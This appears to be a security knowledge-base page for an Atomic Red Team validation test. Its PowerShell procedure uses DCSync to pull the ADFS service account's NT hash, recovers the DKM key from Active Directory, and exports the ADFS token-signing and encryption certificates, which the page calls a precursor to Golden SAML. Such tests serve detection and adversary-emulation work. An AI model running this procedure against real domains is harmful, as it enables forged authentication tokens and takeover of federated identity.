---
atomic_guid: "cab413d8-9e4a-4b8d-9b84-c985bd73a442"
title: "ADFS token signing and encryption certificates theft - Remote"
framework: "atomic"
generated: "true"
attack_technique_id: "T1552.004"
attack_technique_name: "Unsecured Credentials: Private Keys"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "cab413d8-9e4a-4b8d-9b84-c985bd73a442"
  - "ADFS token signing and encryption certificates theft - Remote"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# ADFS token signing and encryption certificates theft - Remote

Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.

## Metadata

- Atomic GUID: cab413d8-9e4a-4b8d-9b84-c985bd73a442
- Technique: T1552.004: Unsecured Credentials: Private Keys
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1552.004/T1552.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1552-unsecured_credentials|T1552.004]]

## Input Arguments

### adfs_server_name

- description: Name of an ADFS server
- type: string
- default: sts.contoso.com

### adfs_service_account_name

- description: Name of the ADFS service account
- type: string
- default: adfs_svc

### replication_password

- description: Password of replication_username
- type: string
- default: ReallyStrongPassword

### replication_user

- description: Username with replication rights. It can be the Domain Admin running the script
- type: string
- default: Administrator

## Dependencies

AADInternals and ActiveDirectory modules must be installed.

### Prerequisite Check

```powershell
if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}
```

### Get Prerequisite

```powershell
Install-Module -Name AADInternals -Force
```

## Executor

- name: powershell

### Command

```powershell
Import-Module ActiveDirectory -Force 
Import-Module AADInternals -Force | Out-Null
#Get Configuration
$dcServerName = (Get-ADDomainController).HostName
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq "#{adfs_service_account_name}"
$PWord = ConvertTo-SecureString -String "#{replication_password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord
# use DCSync to fetch the ADFS service account's NT hash
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}
# Get certificates decryption key
$Configuration = [xml]$ADFSConfig
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
$base = "LDAP://CN=$group,$container,$parent"
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add("displayName") | Out-Null
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties["displayName"] 
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null
$ADSearch.Filter="(l=$keyObjectGuid)"
$aduser=$ADSearch.FindOne() 
$key=[byte[]]$aduser.Properties["thumbnailphoto"][0] 
# Get encrypted certificates from configuration and decrypt them
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key
Get-ChildItem | Where-Object {$_ -like "ADFS*"}
Write-Host "`nCertificates retrieved successfully"
```

### Cleanup

```powershell
Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.yaml)
